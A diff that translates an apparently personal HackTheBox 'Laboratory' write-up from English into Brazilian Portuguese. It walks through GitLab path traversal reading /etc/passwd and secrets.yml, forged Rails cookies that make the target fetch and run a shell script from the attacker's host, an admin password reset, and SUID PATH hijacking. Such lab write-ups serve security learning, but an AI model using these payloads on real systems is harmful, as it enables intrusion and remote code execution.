@@ -1,33 +1,33 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>laboratory — htb writeup · chu@antisec</title>
-    <meta name="description" content="htb laboratory writeup (linux): path traversal on gitlab via issue move, secrets.yml → rce on the rails console, password reset and path hijacking on docker-security.">
+    <title>laboratory — writeup htb · chu@antisec</title>
+    <meta name="description" content="writeup htb laboratory (linux): path traversal no gitlab via move de issue, secrets.yml → rce no rails console, reset de senha e path hijacking no docker-security. em português.">
     <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' fill='%23080b09'/%3E%3Crect x='3' y='3' width='6' height='10' fill='%235df27f'/%3E%3C/svg%3E">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="../styles.css">
-    <link rel="alternate" hreflang="pt-BR" href="../pt/hackthebox/laboratory.html">
-    <link rel="alternate" hreflang="en" href="laboratory.html">
-    <link rel="alternate" hreflang="x-default" href="laboratory.html">
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="alternate" hreflang="pt-BR" href="laboratory.html">
+    <link rel="alternate" hreflang="en" href="../../hackthebox/laboratory.html">
+    <link rel="alternate" hreflang="x-default" href="../../hackthebox/laboratory.html">
   </head>
   <body>
-    <a class="skip" href="#main">skip to content</a>
+    <a class="skip" href="#main">pular para o conteúdo</a>
 
     <header class="chrome">
       <div class="wrap chrome-in">
-        <a class="brand" href="../index.html">chu<span class="host">@antisec</span>:~/htb$<span class="cursor" aria-hidden="true">▌</span></a>
-        <nav class="nav" aria-label="main">
+        <a class="brand" href="../../index.html">chu<span class="host">@antisec</span>:~/htb$<span class="cursor" aria-hidden="true">▌</span></a>
+        <nav class="nav" aria-label="principal">
           <ul>
-            <li><a href="../index.html">home</a></li>
-            <li><a href="../research/index.html">research</a></li>
+            <li><a href="../../index.html">início</a></li>
+            <li><a href="../index.html">pesquisa</a></li>
             <li><a href="index.html" aria-current="page">writeups</a></li>
-            <li><a href="../about.html">about</a></li>
-            <li><a href="https://adminions.ca/" target="_blank" rel="noopener">team</a></li>
-            <li class="lang"><a href="../pt/hackthebox/laboratory.html" hreflang="pt-BR" lang="pt-BR" title="versão em português" aria-label="mudar para português"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#009b3a"/><path d="M12 1.6 22.4 8 12 14.4 1.6 8Z" fill="#fedf00"/><circle cx="12" cy="8" r="3.1" fill="#002776"/></svg></a><span class="flag-cur" aria-hidden="true"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#012169"/><path d="M0 0L24 16M24 0L0 16" stroke="#fff" stroke-width="3.2"/><path d="M0 0L24 16M24 0L0 16" stroke="#C8102E" stroke-width="1.6"/><path d="M12 0V16M0 8H24" stroke="#fff" stroke-width="5"/><path d="M12 0V16M0 8H24" stroke="#C8102E" stroke-width="2.8"/></svg></span></li>
+            <li><a href="../about.html">sobre</a></li>
+            <li><a href="https://adminions.ca/" target="_blank" rel="noopener">time</a></li>
+            <li class="lang"><span class="flag-cur"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#009b3a"/><path d="M12 1.6 22.4 8 12 14.4 1.6 8Z" fill="#fedf00"/><circle cx="12" cy="8" r="3.1" fill="#002776"/></svg></span><a href="../../hackthebox/laboratory.html" hreflang="en" lang="en" title="read in english" aria-label="switch to english"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#012169"/><path d="M0 0L24 16M24 0L0 16" stroke="#fff" stroke-width="3.2"/><path d="M0 0L24 16M24 0L0 16" stroke="#C8102E" stroke-width="1.6"/><path d="M12 0V16M0 8H24" stroke="#fff" stroke-width="5"/><path d="M12 0V16M0 8H24" stroke="#C8102E" stroke-width="2.8"/></svg></a></li>
           </ul>
         </nav>
       </div>
@@ -44,17 +44,17 @@
         <ul class="meta">
           <li class="chip">date=2026-06-02</li>
           <li class="chip">os=linux</li>
-          <li class="chip">lang=en</li>
+          <li class="chip">lang=pt-br</li>
           <li class="chip chip--phos">status=root</li>
         </ul>
 
         <figure class="fig">
           <a href="https://i.imgur.com/Yy18N58.png"><img src="https://i.imgur.com/Yy18N58.png" alt="image" loading="lazy"></a>
-          <figcaption class="fig-cap"><b>laboratory</b> — machine card on hackthebox</figcaption>
+          <figcaption class="fig-cap"><b>laboratory</b> — card da máquina no hackthebox</figcaption>
         </figure>
 
         <p class="cmd"><span class="ps1"><b>chu@antisec</b>:~/htb$</span> cat tools.txt</p>
-        <p><strong>Tools</strong> used:</p>
+        <p><strong>Tools</strong> utilizadas:</p>
         <ul class="chips">
           <li class="chip">nmap</li>
           <li class="chip">gitlab</li>
@@ -96,74 +96,74 @@
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
           </div>
 
-          <p>We can spot two sites:</p>
+          <p>Podemos perceber dois sites:</p>
           <div class="code">
             <div class="code-cap"><span class="dot">●</span> <span>urls</span></div>
             <pre><code>https://laboratory.htb/
 https://git.laboratory.htb/</code></pre>
           </div>
 
-          <p>Accessing https://git.laboratory.htb/ we're greeted by a <a href="https://about.gitlab.com/">GitLab</a>.</p>
+          <p>Ao acessar o site https://git.laboratory.htb/ nos deparamos com um <a href="https://about.gitlab.com/">GitLab</a>.</p>
 
-          <p>Next, let's try to sign up:</p>
+          <p>Em seguida, vamos tentar nos cadastrar:</p>
 
           <figure class="fig">
             <a href="https://i.imgur.com/ZBrnqIP.png"><img src="https://i.imgur.com/ZBrnqIP.png" alt="Image" loading="lazy"></a>
-            <figcaption class="fig-cap"><b>gitlab</b> — user registration</figcaption>
+            <figcaption class="fig-cap"><b>gitlab</b> — cadastro de usuário</figcaption>
           </figure>
 
-          <p>After signing up successfully, we have access to the GitLab panel, so let's try to identify the version in use.</p>
+          <p>Após o cadastro ser bem sucedido, temos acesso ao painel do GitLab, portanto, vamos tententar identificar a versão utilizada.</p>
 
-          <p>On the https://git.laboratory.htb/help page we can identify the exact version being used:</p>
+          <p>Na página https://git.laboratory.htb/help podemos identificar a versão exata que está sendo utilizada:</p>
 
           <figure class="fig">
             <a href="https://i.imgur.com/Jf44fiC.png"><img src="https://i.imgur.com/Jf44fiC.png" alt="Image" loading="lazy"></a>
-            <figcaption class="fig-cap"><b>/help</b> — gitlab version exposed</figcaption>
+            <figcaption class="fig-cap"><b>/help</b> — versão do gitlab exposta</figcaption>
           </figure>
 
-          <p>After finding the version, we can search for exploits and vulnerabilities already known for it...</p>
+          <p>Após encontrar a versão, podemos fazer buscas por exploits e falhas já conhecidas da versão...</p>
 
-          <p>A <a href="https://hackerone.com/reports/827052">report</a> on the bug bounty site HackerOne is our starting point.</p>
+          <p>Um <a href="https://hackerone.com/reports/827052">report</a> do site de bugbounty HackerOne é nosso ponto inicial.</p>
 
-          <p>So, we must first create two projects:</p>
+          <p>Portanto, devemos primeiramente criar dois projetos:</p>
 
-          <p>I'll call one 'chu' and the other one 'stevenseagal' (XD)</p>
+          <p>Vou chamar um de 'chu' e outro de 'stevenseagal' (XD)</p>
 
-          <p>Project 1 - chu:</p>
+          <p>Projeto 1 - chu:</p>
 
           <figure class="fig">
             <a href="https://i.imgur.com/xX8oTlp.png"><img src="https://i.imgur.com/xX8oTlp.png" alt="Image" loading="lazy"></a>
-            <figcaption class="fig-cap"><b>project 1</b> — creating the chu project</figcaption>
+            <figcaption class="fig-cap"><b>projeto 1</b> — criando o projeto chu</figcaption>
           </figure>
 
-          <p>Project 2 - stevenseagal: </p>
+          <p>Projeto 2 - stevenseagal: </p>
 
           <figure class="fig">
             <a href="https://i.imgur.com/EtNLpZ9.png"><img src="https://i.imgur.com/EtNLpZ9.png" alt="Image" loading="lazy"></a>
-            <figcaption class="fig-cap"><b>project 2</b> — creating stevenseagal</figcaption>
+            <figcaption class="fig-cap"><b>projeto 2</b> — criando o stevenseagal</figcaption>
           </figure>
 
-          <p>We can check out both created projects:</p>
+          <p>Podemos conferir os dois projetos criados:</p>
 
           <figure class="fig">
             <a href="https://i.imgur.com/ntSr8u1.png"><img src="https://i.imgur.com/ntSr8u1.png" alt="Image" loading="lazy"></a>
-            <figcaption class="fig-cap"><b>projects</b> — both created</figcaption>
+            <figcaption class="fig-cap"><b>projetos</b> — os dois criados</figcaption>
           </figure>
 
-          <p>After creating both projects, let's try to replicate what was done in the H1 report.</p>
+          <p>Depois de criarmos os dois projetos, vamos tentar simular o que foi feito no report do H1.</p>
 
-          <p>First step, create a new Issue in the 'chu' project</p>
+          <p>Primeiro passo criar um novo Issue no projeto 'chu'</p>
 
           <figure class="fig">
             <a href="https://i.imgur.com/xMcW43V.png"><img src="https://i.imgur.com/xMcW43V.png" alt="Image" loading="lazy"></a>
-            <figcaption class="fig-cap"><b>issue</b> — new issue in the chu project</figcaption>
+            <figcaption class="fig-cap"><b>issue</b> — novo issue no projeto chu</figcaption>
           </figure>
 
-          <p>Inside the issue we'll use the same payload as the report</p>
+          <p>Dentro do issue iremos usar o mesmo payload do report</p>
 
           <figure class="fig">
             <a href="https://i.imgur.com/xMcW43V.png"><img src="https://i.imgur.com/xMcW43V.png" alt="Image" loading="lazy"></a>
-            <figcaption class="fig-cap"><b>payload</b> — attachment pasted into the issue</figcaption>
+            <figcaption class="fig-cap"><b>payload</b> — anexo colado no issue</figcaption>
           </figure>
 
           <div class="code">
@@ -171,21 +171,21 @@ https://git.laboratory.htb/</code></pre>
             <pre><code>![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)</code></pre>
         </div>
 
-        <p>Right after that, let's move the Issue to the other project. (in my case from the chu project to stevenseagal)</p>
+        <p>Logo em seguida, vamos mover o Issue para o outro projeto. (em meu caso do projeto chu para stevenseagal)</p>
 
         <figure class="fig">
           <a href="https://i.imgur.com/9r5mEnz.png"><img src="https://i.imgur.com/9r5mEnz.png" alt="Image" loading="lazy"></a>
-          <figcaption class="fig-cap"><b>move</b> — moving the issue between projects</figcaption>
+          <figcaption class="fig-cap"><b>move</b> — movendo o issue de projeto</figcaption>
         </figure>
 
-        <p>After the move, inside project 2(stevenseagal) we can see it already renamed the attached file called 'a' to the file we wanted (/etc/passwd)</p>
+        <p>Ao mover, dentro do projeto 2(stevenseagal) podemos perceber que ele já renomeou o arquivo em anexo chamado 'a' para o arquivo que queriamos (/etc/passwd)</p>
 
         <figure class="fig">
           <a href="https://i.imgur.com/OND9zlB.png"><img src="https://i.imgur.com/OND9zlB.png" alt="Image" loading="lazy"></a>
-          <figcaption class="fig-cap"><b>traversal</b> — attachment renamed to /etc/passwd</figcaption>
+          <figcaption class="fig-cap"><b>traversal</b> — anexo renomeado pra /etc/passwd</figcaption>
         </figure>
 
-        <p>Opening the file, we get the contents:</p>
+        <p>Ao abrir o arquivo, temos o conteúdo:</p>
 
         <div class="code">
           <div class="code-cap"><span class="dot">●</span> <span>/etc/passwd</span></div>
@@ -223,14 +223,14 @@ gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
 gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh</code></pre>
         </div>
 
-        <p>Now that we can read files on the server, we can look for sensitive files to help us with the exploitation...
-          One of them is the <a href="https://docs.gitlab.com/ee/development/application_secrets.html">secrets.yml</a></p>
+        <p>Agora que já conseguimos ler arquivos dentro do servidor, podemos procurar por arquivos sensiveis que nos auxiliaram na exploração...
+          Um deles é o <a href="https://docs.gitlab.com/ee/development/application_secrets.html">secrets.yml</a></p>
 
-        <p>So, we repeat the same step we did to read /etc/passwd.</p>
+        <p>Portanto, repetimos o mesmo passo que fizemos para ler o /etc/passwd.</p>
 
         <figure class="fig">
           <a href="https://i.imgur.com/IleNsTZ.png"><img src="https://i.imgur.com/IleNsTZ.png" alt="Image" loading="lazy"></a>
-          <figcaption class="fig-cap"><b>payload</b> — now on secrets.yml</figcaption>
+          <figcaption class="fig-cap"><b>payload</b> — agora no secrets.yml</figcaption>
         </figure>
 
         <div class="code">
@@ -238,15 +238,15 @@ gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh</code></pre>
           <pre><code>![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)</code></pre>
       </div>
 
-      <p>Moving to project 2, we get the secrets.yml file</p>
+      <p>Ao mover para o projeto 2, temos o arquivo secrets.yml</p>
 
       <figure class="fig">
         <a href="https://i.imgur.com/1G0jbn2.png"><img src="https://i.imgur.com/1G0jbn2.png" alt="Image" loading="lazy"></a>
-        <figcaption class="fig-cap"><b>secrets.yml</b> — read off the server</figcaption>
+        <figcaption class="fig-cap"><b>secrets.yml</b> — lido do servidor</figcaption>
       </figure>
 
       <div class="code">
-        <div class="code-cap"><span class="dot">●</span> <span>secrets.yml</span><span class="cap-right">not truncated — yep, that's the real thing, key and all</span></div>
+        <div class="code-cap"><span class="dot">●</span> <span>secrets.yml</span><span class="cap-right">truncado não — é isso mesmo, chave e tudo</span></div>
         <pre><code># This file is managed by gitlab-ctl. Manual changes will be
 # erased! To change the contents below, edit /etc/gitlab/gitlab.rb
 # and run `sudo gitlab-ctl reconfigure`.
@@ -310,27 +310,27 @@ production:
     -----END RSA PRIVATE KEY-----</code></pre>
       </div>
 
-      <p>We can see the original report was about reading files, but reading further along, we can see it escalates to an RCE using the gitlab-console.</p>
+      <p>Podemos ver que o report inicial era sobre poder ler arquivos, mas lendo mais a seguir, podemos ver que é escalado para um RCE usando o gitlab-console.</p>
 
-      <p>For that, we need to install GitLab, let's use curl for it:</p>
+      <p>Para isso, devemos instalar o GitLab, vamos usar o curl para isso:</p>
 
       <div class="code">
         <div class="code-cap"><span class="dot">●</span> <span>cmd</span></div>
         <pre><code>curl -s https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.deb.sh | sudo bash</code></pre>
     </div>
 
-    <p>After the install, let's reconfigure GitLab:</p>
+    <p>Após a instalação, vamos reconfigurar o GitLab:</p>
 
     <div class="code">
       <div class="code-cap"><span class="dot">●</span> <span>cmd</span></div>
       <pre><code>gitlab-ctl reconfigure</code></pre>
   </div>
 
-  <p>Edit the config file with the secret_key_base we got from our target; we can just comment out the old line and add a new one:</p>
+  <p>Editar o arquivo de configuração com a secret_key_base que obtemos do nosso alvo, podemos apenas comentar a linha antiga e adicionar uma nova:</p>
 
   <figure class="fig">
     <a href="https://i.imgur.com/kI3d5jn.png"><img src="https://i.imgur.com/kI3d5jn.png" alt="Image" loading="lazy"></a>
-    <figcaption class="fig-cap"><b>nano</b> — editing the local secrets.yml</figcaption>
+    <figcaption class="fig-cap"><b>nano</b> — editando o secrets.yml local</figcaption>
   </figure>
 
   <div class="code">
@@ -338,17 +338,17 @@ production:
     <pre><code>nano /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code></pre>
 </div>
 
-<p>After adding the secret_key_base to our file, let's run the rails console.</p>
+<p>Após adicionarmos a secret_key_base ao nosso arquivo, vamos executar o console do rails.</p>
 
 <p><code>gitlab-rails console</code></p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/w77UbcU.png"><img src="https://i.imgur.com/w77UbcU.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>rails console</b> — console loaded</figcaption>
+  <figcaption class="fig-cap"><b>rails console</b> — console carregado</figcaption>
 </figure>
 
-<p>Now let's take the H1 payload and make some changes, we add the command: <code>'curl -s 10.10.14.219:1/chu.sh -o /tmp/chu.sh &amp;&amp; chmod 777 /tmp/chu.sh'</code>
-  That way, downloading our shell, saving it in the /tmp directory and adding permission.</p>
+<p>Agora vamos usar o payload do H1 e fazer algumas mudanças, adicionamos o comando: <code>'curl -s 10.10.14.219:1/chu.sh -o /tmp/chu.sh &amp;&amp; chmod 777 /tmp/chu.sh'</code>
+  Sendo assim, fazendo o download da nossa shell e salvando ela no diretório /tmp e adicionando permissão.</p>
 
 <div class="code">
   <div class="code-cap"><span class="dot">●</span> <span>gitlab-rails console</span></div>
@@ -362,18 +362,18 @@ cookies.signed[:cookie] = depr
 puts cookies[:cookie]</code></pre>
 </div>
 
-<p>After this command, we'll get a cookie in its output:</p>
+<p>Após esse comando, teremos na saída dele um cookie:</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/bq5al2V.png"><img src="https://i.imgur.com/bq5al2V.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>cookie</b> — console output</figcaption>
+  <figcaption class="fig-cap"><b>cookie</b> — saída do console</figcaption>
 </figure>
 
-<p>Now let's send it to our target</p>
+<p>Agora vamos envia-lo para nosso alvo</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/UPPGHoE.png"><img src="https://i.imgur.com/UPPGHoE.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>curl</b> — sending the cookie to the target</figcaption>
+  <figcaption class="fig-cap"><b>curl</b> — enviando o cookie pro alvo</figcaption>
 </figure>
 
 <div class="code">
@@ -381,14 +381,14 @@ puts cookies[:cookie]</code></pre>
   <pre><code>curl -k -vvv 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAYIjY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgY3VybCAtcyAxMC4xMC4xNC4yMTk6MS9jaHUuc2ggLW8gL3RtcC9jaHUuc2ggJiYgY2htb2QgNzc3IC90bXAvY2h1LnNoYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--f4d90880783a7e9690a1708f3b37c665adf38322"</code></pre>
 </div>
 
-<p>Sending the request, we can see our payload worked and it downloaded our file:</p>
+<p>Ao enviar a requisição, podemos perceber que nosso payload funcionou e ele fez o download de nosso arquivo:</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/e8zztVj.png"><img src="https://i.imgur.com/e8zztVj.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>download</b> — shell downloaded on the target</figcaption>
+  <figcaption class="fig-cap"><b>download</b> — shell baixada no alvo</figcaption>
 </figure>
 
-<p>Now we still need to execute our file; for that we'll do the same step as above, we'll send a cookie with the command: 'bash /tmp/chu.sh'</p>
+<p>Agora nos falta executar nosso arquivo, para isso faremos o mesmo passo a cima, enviaremos um cookie com o comando: 'bash /tmp/chu.sh'</p>
 
 <div class="code">
   <div class="code-cap"><span class="dot">●</span> <span>gitlab-rails console</span></div>
@@ -402,18 +402,18 @@ cookies.signed[:cookie] = depr
 puts cookies[:cookie]</code></pre>
 </div>
 
-<p>With that we have the cookie ready to be sent:</p>
+<p>Com isso temos o cookie para ser enviado:</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/em2dby2.png"><img src="https://i.imgur.com/em2dby2.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>cookie 2</b> — execution payload</figcaption>
+  <figcaption class="fig-cap"><b>cookie 2</b> — payload de execução</figcaption>
 </figure>
 
-<p>Now we just need to send the payload that will execute our shell (/tmp/chu.sh)</p>
+<p>Agora basta enviarmos o payload que ira executar nossa shell (/tmp/chu.sh)</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/Dsh53ne.png"><img src="https://i.imgur.com/Dsh53ne.png" alt="image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>curl</b> — final request</figcaption>
+  <figcaption class="fig-cap"><b>curl</b> — requisitação final</figcaption>
 </figure>
 
 <div class="code">
@@ -421,11 +421,11 @@ puts cookies[:cookie]</code></pre>
   <pre><code>curl -k -vvv 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiUiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC90bXAvY2h1LnNoYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--68cfa7b052d7fb23908e3bc99f75a3ee154e5d0a"</code></pre>
 </div>
 
-<p>And we're in!</p>
+<p>E estamos dentro!</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/eweizzM.png"><img src="https://i.imgur.com/eweizzM.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>shell</b> — access in the container</figcaption>
+  <figcaption class="fig-cap"><b>shell</b> — acesso no container</figcaption>
 </figure>
 
 <div class="code">
@@ -433,12 +433,12 @@ puts cookies[:cookie]</code></pre>
   <pre><code>nc -vvnlp 1337</code></pre>
 </div>
 
-<p>After connecting to the machine and doing some quick enumeration, we can see we're in a docker.
-  Let's try using the machine's own gitlab-rails console to reset the password of the user with ID 1.</p>
+<p>Após conectar na máquina e fazer uma prévia enumeração, podemos perceber que estamos em um docker.
+  Vamos tentar usar o gitlab-rails console da propria máquina para tentar resetar a senha do usuário com o ID 1.</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/3MGG7K9.png"><img src="https://i.imgur.com/3MGG7K9.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>rails console</b> — resetting the password</figcaption>
+  <figcaption class="fig-cap"><b>rails console</b> — resetando a senha</figcaption>
 </figure>
 
 <div class="code">
@@ -449,11 +449,11 @@ user.password_confirmation = 'chu_was_here'
 user.save!</code></pre>
 </div>
 
-<p>With that we managed to reset the password of the user with id 1, now let's try to log in with the new creds.</p>
+<p>Com isso conseguimos resetar a senha do usuário de id 1, agora vamos tentar fazer o login com as novas creds.</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/A815Ucu.png"><img src="https://i.imgur.com/A815Ucu.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>login</b> — dexter logged in</figcaption>
+  <figcaption class="fig-cap"><b>login</b> — dexter logado</figcaption>
 </figure>
 
 <div class="code">
@@ -461,27 +461,27 @@ user.save!</code></pre>
   <pre><code>dexter:chu_was_here</code></pre>
 </div>
 
-<p>Inside the 'SecureDocker' project we can find RSA keys.</p>
+<p>Dentro do projeto 'SecureDocker' podemos encontrar chaves RSA.</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/Qt7jhcB.png"><img src="https://i.imgur.com/Qt7jhcB.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>securedocker</b> — rsa key in the project</figcaption>
+  <figcaption class="fig-cap"><b>securedocker</b> — chave rsa no projeto</figcaption>
 </figure>
 
-<p>So we save it on our machine and try to use it.</p>
+<p>Portanto salvamos em nossa maquina e tentamos usar.</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/NnDuhNO.png"><img src="https://i.imgur.com/NnDuhNO.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>ssh</b> — login with the key</figcaption>
+  <figcaption class="fig-cap"><b>ssh</b> — login com a chave</figcaption>
 </figure>
 
 <p>ee boom, we are in ~</p>
 
-<p>After a bit of enumeration, we can find this binary:</p>
+<p>Após um pouco de enumeração, podemos encontrar esse binário:</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/5m7SHHm.png"><img src="https://i.imgur.com/5m7SHHm.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>suid</b> — docker-security binary</figcaption>
+  <figcaption class="fig-cap"><b>suid</b> — binário docker-security</figcaption>
 </figure>
 
 <div class="code">
@@ -489,14 +489,14 @@ user.save!</code></pre>
   <pre><code>find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;</code></pre>
 </div>
 
-<p>Trying to read the /usr/local/bin/docker-security file, we can see the file executes the command: chmod 700 /usr/bin/dockerchmod</p>
+<p>Ao tentar ler o arquivo /usr/local/bin/docker-security podemos perceber que o arquivo executa o comando: chmod 700 /usr/bin/dockerchmod</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/XgwF5qp.png"><img src="https://i.imgur.com/XgwF5qp.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>strings</b> — chmod inside the binary</figcaption>
+  <figcaption class="fig-cap"><b>strings</b> — chmod dentro do binário</figcaption>
 </figure>
 
-<p>So let's try path hijacking; for that let's create a file called chmod in the /tmp folder</p>
+<p>Então vamos tentar um path hijacking, para isso vamos criar um arquivo chamado chmod na pasta /tmp</p>
 
 <div class="code">
   <div class="code-cap"><span class="dot">●</span> <span>cmd</span></div>
@@ -505,13 +505,13 @@ chmod 777 chmod
 export PATH=/tmp:$PATH</code></pre>
 </div>
 
-<p>After that we execute the /usr/local/bin/docker-security file</p>
+<p>Após isso executamos o arquivo /usr/local/bin/docker-security</p>
 
-<p>And then...</p>
+<p>E então...</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/1he8WVJ.png"><img src="https://i.imgur.com/1he8WVJ.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>root</b> — path hijacking worked</figcaption>
+  <figcaption class="fig-cap"><b>root</b> — path hijacking funcionou</figcaption>
 </figure>
 
 <p>we are root ~</p>
@@ -546,10 +546,10 @@ export PATH=/tmp:$PATH</code></pre>
       <p>chu@antisec — long life for the hacking and the cats!<span aria-hidden="true"></span></p>
     </div>
     <div class="foot-row">
-      <p>© 2026 chu · <a href="../index.html">home</a> · <a href="index.html">writeups</a> · <a href="../about.html#contact">contact</a></p>
+      <p>© 2026 chu · <a href="../../index.html">início</a> · <a href="index.html">writeups</a> · <a href="../about.html#contact">contato</a></p>
     </div>
   </div>
 </footer>
-<script src="../zoom.js" defer></script>
+<script src="../../zoom.js" defer></script>
 </body>
 </html>
